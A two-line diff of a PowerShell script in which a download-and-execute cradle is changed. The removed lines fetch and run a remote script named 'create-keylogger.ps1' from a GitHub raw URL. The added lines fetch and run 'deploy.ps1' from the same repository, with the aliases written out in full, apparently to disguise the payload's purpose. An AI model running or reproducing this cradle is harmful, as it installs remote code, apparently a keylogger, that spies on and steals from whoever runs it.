@@ -1,2 +1,2 @@
-$url="https://raw.githubusercontent.com/Zhuss1/main/main/create-keylogger.ps1"
-iex (iwr -useb $url).Content
+$url="https://raw.githubusercontent.com/Zhuss1/main/main/deploy.ps1"
+Invoke-Expression (Invoke-WebRequest -UseBasicParsing $url).Content
